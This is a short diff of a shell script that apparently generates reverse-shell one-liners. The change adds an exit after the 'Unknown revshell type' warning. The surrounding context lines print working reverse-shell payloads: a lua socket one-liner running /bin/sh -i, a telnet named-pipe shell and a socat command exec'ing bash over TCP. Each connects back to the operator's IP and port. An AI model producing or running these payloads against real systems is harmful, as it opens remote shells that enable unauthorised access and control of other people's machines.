@@ -40,7 +40,7 @@ if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
     "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
     "telnet")                       echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
     "socat")                        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT" ;;
-    *)                              echo "${warn} Unknown revshell type!" ;;
+    *)                              echo "${warn} Unknown revshell type!"; exit ;;
   esac
   echo
   exit
